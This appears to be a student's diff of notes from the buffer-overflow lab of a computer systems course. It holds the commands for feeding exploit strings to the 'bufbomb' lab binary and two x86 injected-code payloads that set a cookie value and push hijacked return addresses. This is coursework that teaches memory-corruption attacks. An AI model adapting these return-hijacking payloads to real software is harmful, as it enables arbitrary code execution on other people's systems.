@@ -1,0 +1,19 @@
+'/home/pwwp/Desktop/ICS/buflab-handout/sendstring' < '/home/pwwp/Desktop/ICS/buflab-handout/send_in' > '/home/pwwp/Desktop/ICS/buflab-handout/send_out' 
+
+'/home/pwwp/Desktop/ICS/buflab-handout/bufbomb' -t ics5120379066 <'/home/pwwp/Desktop/ICS/buflab-handout/send_out'
+
+gcc -c '/home/pwwp/buftest.s' 
+
+objdump -D '/home/pwwp/buftest.o' 
+
+prg_03_bang.s
+
+	movl $0x804a1c4,%ecx
+	movl $0x57a1c344,(%ecx)
+	push $0x8048e10
+	ret
+
+prg_04_test
+	movl $0x57a1c344,%eax
+	push $0x8048db2
+	ret
